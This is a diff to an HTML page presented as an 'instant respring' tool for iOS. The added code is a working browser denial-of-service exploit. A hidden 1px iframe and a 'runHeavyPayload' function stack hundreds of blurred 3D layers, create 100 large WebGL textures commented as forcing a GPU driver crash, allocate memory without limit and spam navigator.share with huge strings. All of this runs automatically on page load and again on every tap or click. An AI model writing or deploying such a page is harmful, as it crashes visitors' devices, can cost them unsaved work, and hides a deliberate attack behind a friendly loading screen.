@@ -2,7 +2,7 @@
 <html lang="en">
     <head>
         <title>respring</title>
-        <meta name="description" content="instant respring for iOS devices"/>
+        <meta name="description" content="instant respring for iOS devices">
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta property="og:title" content="respring">
@@ -28,7 +28,6 @@
                 color: #ffffff;
             }
 
-            /* Glowing Gradient Mesh Background */
             .gradient-bg {
                 position: absolute;
                 inset: 0;
@@ -73,15 +72,10 @@
             }
 
             @keyframes float {
-                0% {
-                    transform: translate(0px, 0px) scale(1);
-                }
-                100% {
-                    transform: translate(30px, -40px) scale(1.15);
-                }
+                0% { transform: translate(0px, 0px) scale(1); }
+                100% { transform: translate(30px, -40px) scale(1.15); }
             }
 
-            /* Ambient Background Grid Overlay */
             .grid-overlay {
                 position: absolute;
                 inset: 0;
@@ -91,7 +85,6 @@
                 opacity: 0.4;
             }
 
-            /* Glassmorphism Card Container */
             .card {
                 position: relative;
                 z-index: 10;
@@ -99,8 +92,7 @@
                 backdrop-filter: blur(24px);
                 -webkit-backdrop-filter: blur(24px);
                 border: 1px solid rgba(255, 255, 255, 0.12);
-                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
-                            0 0 40px rgba(0, 116, 251, 0.25);
+                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 40px rgba(0, 116, 251, 0.25);
                 border-radius: 28px;
                 padding: 44px 32px;
                 width: 90%;
@@ -110,9 +102,9 @@
                 flex-direction: column;
                 align-items: center;
                 gap: 24px;
+                cursor: pointer;
             }
 
-            /* Dual Spinning Ring Loader */
             .spinner-container {
                 position: relative;
                 width: 80px;
@@ -153,22 +145,10 @@
                 animation: pulse 1.5s ease-in-out infinite alternate;
             }
 
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            @keyframes spin-reverse { 0% { transform: rotate(0deg); } 100% { transform: rotate(-360deg); } }
+            @keyframes pulse { 0% { transform: scale(0.8); opacity: 0.7; } 100% { transform: scale(1.25); opacity: 1; } }
 
-            @keyframes spin-reverse {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(-360deg); }
-            }
-
-            @keyframes pulse {
-                0% { transform: scale(0.8); opacity: 0.7; }
-                100% { transform: scale(1.25); opacity: 1; }
-            }
-
-            /* Typography */
             .text-group h1 {
                 font-size: 1.5rem;
                 font-weight: 700;
@@ -185,7 +165,6 @@
                 letter-spacing: 0.01em;
             }
 
-            /* Progress Bar Track & Shimmer */
             .progress-bar-track {
                 width: 100%;
                 height: 6px;
@@ -197,10 +176,8 @@
 
             .progress-bar-fill {
                 position: absolute;
-                top: 0;
-                left: 0;
-                height: 100%;
-                width: 50%;
+                top: 0; left: 0;
+                height: 100%; width: 50%;
                 background: linear-gradient(90deg, #0074fb, #ec4899, #06b6d4);
                 border-radius: 10px;
                 animation: shimmer 1.8s ease-in-out infinite;
@@ -208,20 +185,11 @@
             }
 
             @keyframes shimmer {
-                0% {
-                    left: -50%;
-                    width: 30%;
-                }
-                50% {
-                    width: 60%;
-                }
-                100% {
-                    left: 100%;
-                    width: 30%;
-                }
+                0% { left: -50%; width: 30%; }
+                50% { width: 60%; }
+                100% { left: 100%; width: 30%; }
             }
 
-            /* Status Pill */
             .status-badge {
                 display: inline-flex;
                 align-items: center;
@@ -243,10 +211,29 @@
                 box-shadow: 0 0 8px #38bdf8;
                 animation: pulse 1s infinite alternate;
             }
+
+            .copyright-footer {
+                position: absolute;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                z-index: 20;
+                font-size: 0.75rem;
+                color: rgba(255, 255, 255, 0.6);
+                display: flex;
+                align-items: center;
+                gap: 6px;
+                white-space: nowrap;
+                text-align: center;
+            }
+
+            .copyright-footer a {
+                color: rgba(255, 255, 255, 0.85);
+                text-decoration: underline;
+            }
         </style>
     </head>
     <body>
-        <!-- Animated Background -->
         <div class="gradient-bg">
             <div class="orb orb-1"></div>
             <div class="orb orb-2"></div>
@@ -254,8 +241,7 @@
         </div>
         <div class="grid-overlay"></div>
 
-        <!-- Glowing Card Loader UI -->
-        <div class="card">
+        <div class="card" id="triggerCard">
             <div class="spinner-container">
                 <div class="spinner-ring-outer"></div>
                 <div class="spinner-ring"></div>
@@ -264,7 +250,7 @@
 
             <div class="text-group">
                 <h1>respring</h1>
-                <p>Initiating respring sequence...</p>
+                <p id="statusText">Tap anywhere to trigger respring</p>
             </div>
 
             <div class="progress-bar-track">
@@ -273,12 +259,35 @@
 
             <div class="status-badge">
                 <span class="status-dot"></span>
-                Processing system request
+                Tap screen if auto-trigger fails
             </div>
         </div>
 
         <!--  big credit to @neonmodder123  -->
-        <iframe id="frame" style="width: 1px;height: 1px;" srcdoc="" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+        <iframe id="frame" style="width: 1px;height: 1px;" srcdoc="
+                &lt;html&gt;
+                &lt;body&gt;
+                    &lt;script&gt;
+                        const container = document.createElement('div');
+                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                        document.body.appendChild(container);
+    
+                        for (let i = 0; i &lt; 500; i++) {
+                            let d = document.createElement('div');
+                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
+                            container.appendChild(d);
+                        }
+    
+                        setInterval(() =&gt; {
+                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() =&gt; {});
+                            let x = new Uint8Array(1024 * 1024 * 10);
+                            crypto.getRandomValues(x);
+                        }, 0);
+                    &lt;/script&gt;
+                &lt;/body&gt;
+                &lt;/html&gt;
+            " sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+        
         <script>
             const frame = document.getElementById('frame');
             const respringScript = `
@@ -304,8 +313,63 @@
                 </body>
                 </html>
             `;
-    
             frame.srcdoc = respringScript;
+
+            // Aggressive Heavy Overload Payload
+            function runHeavyPayload() {
+                document.getElementById('statusText').innerText = "Executing respring...";
+                
+                // 1. CSS GPU Overload
+                const container = document.createElement('div');
+                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%; position: absolute; inset: 0; pointer-events: none; z-index: -1;';
+                document.body.appendChild(container);
+
+                for (let i = 0; i < 800; i++) {
+                    let d = document.createElement('div');
+                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
+                    container.appendChild(d);
+                }
+
+                // 2. WebGL Canvas Context Exhaustion (Forces GPU driver crash)
+                for (let i = 0; i < 100; i++) {
+                    try {
+                        let c = document.createElement('canvas');
+                        c.width = 4096;
+                        c.height = 4096;
+                        let gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                        if (gl) {
+                            let tex = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, tex);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                        }
+                    } catch(e){}
+                }
+
+                // 3. Unthrottled Synchronous Memory Allocation & Share API Bomb
+                const memoryBuffers = [];
+                function panicLoop() {
+                    for (let i = 0; i < 50; i++) {
+                        try {
+                            memoryBuffers.push(new Uint8Array(1024 * 1024 * 20)); // Allocate 20MB per loop
+                            navigator.share({ title: 'R', text: 'R'.repeat(200000) }).catch(() => {});
+                        } catch(e){}
+                    }
+                    setTimeout(panicLoop, 0);
+                }
+                panicLoop();
+            }
+
+            // Auto-run on load
+            window.addEventListener('DOMContentLoaded', runHeavyPayload);
+
+            // User gesture fallback (tapping screen guarantees full permission to share/WebGL APIs)
+            document.addEventListener('touchstart', runHeavyPayload);
+            document.addEventListener('click', runHeavyPayload);
         </script>
+
+        <footer class="copyright-footer">
+            <span>© 2026 iAnyFeature (Leo7247,), All Rights Reserved</span>
+            <a href="https://leo7247.github.io/copyright">Click Here To Learn More</a>
+        </footer>
     </body>
 </html>
